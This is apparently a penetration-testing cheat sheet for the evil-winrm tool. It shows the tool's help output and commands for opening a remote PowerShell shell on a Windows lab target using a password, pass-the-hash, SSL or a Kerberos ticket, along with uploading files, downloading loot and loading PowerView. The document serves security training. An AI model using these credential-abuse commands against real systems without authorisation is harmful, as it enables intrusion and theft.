# evil-winrm

interactive WinRM shell by abusing credentials to get access to a remote Windows PS shell from kali

Useful for:  
- `5985` or `5986` is reachable
- you have valid credentials or an NT hash -> get  interactive remote PS access  
- pass-the-hash with NTLM  
- upload and download of files  
- loading PS scripts into memory  
- Kerberos-authenticated access when tickets are available

WinRM commonly runs on:  
- `5985` = HTTP  
- `5986` = HTTPS / SSL

```bash
└─$ evil-winrm -h                                                   
                                        
Evil-WinRM shell v3.9

Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-a USERAGENT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [-K TICKET_FILE] [--spn SPN_PREFIX] [-l]
    -S, --ssl                        Enable ssl
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
    -K, --ccache TICKET_FILE         Path to Kerberos ticket file (ccache or kirbi format, auto-detected)
    -e, --executables EXES_PATH      C# executables local path
    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
    -U, --url URL                    Remote url endpoint (default /wsman)
    -u, --user USER                  Username (required if not using kerberos)
    -p, --password PASS              Password
    -H, --hash HASH                  NTHash
    -P, --port PORT                  Remote host port (default 5985)
    -a, --user-agent USERAGENT       Specify connection user-agent (default Microsoft WinRM Client)
    -V, --version                    Show version
    -n, --no-colors                  Disable colors
    -N, --no-rpath-completion        Disable remote path completion
    -l, --log                        Log the WinRM session
    -h, --help                       Display this help message
```


### Example network

| Machine         | IP               |
| --------------- | ---------------- |
| Kali (attacker) | 192.168.xx.xxx   |
| Alice (target)  | 192.168.111.137  |
| Network         | 192.168.111.0/24 |

### Remote Access

basic password authentication
```bash  
└─$ evil-winrm -i 192.168.111.137 -u alice -p "alice_password"  
  
Evil-WinRM shell v3.7
       
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\Users\alice\Documents> whoami  
hostname\alice  
```  

pass-the-hash
```bash
evil-winrm -i 192.168.111.137 -u "alice" -H NTLM_HASH
```

SSL / HTTPS WinRM
```bash
evil-winrm -i 192.168.111.137 -u "alice" -p 'password' -S
```
- use `-S` when the target exposes WinRM over HTTPS, typically on port 5986.

custom port 
```bash
evil-winrm -i 192.168.111.137 -u "alice" -p 'password' -P 5986 -S
```

Kerberos / ticket-based auth 
```bash
# e.g. with ticket file 
evil-winrm -i dc01.domain.com -r DOMAIN.COM -K ticket.ccache
```

 
 Helpful flags
- `-i` = target IP or hostname
- `-u` = username
- `-p` = password
- `-H` = NT hash
- `-P` = port
- `-S` = SSL
- `-r` = Kerberos realm
- `-K` = Kerberos ticket file
- `-s` = local PowerShell scripts path
- `-e` = local executables path
- `-l` = log the session

### Built-in shell commands

```bash
# Upload a file
upload local_file.exe C:\Users\Public\file.exe

# Download a file
download C:\Users\Public\loot.txt ./loot.txt

# Load local PS script
loadps /path/to/PowerView.ps1

# Show running services
services

# Show menu / built-ins
menu
```

### Common mistakes

- forgetting `-S` when the service is on 5986 / HTTPS
- using an IP instead of FQDN for Kerberos auth
- assuming pass-the-hash works with non-NT hashes

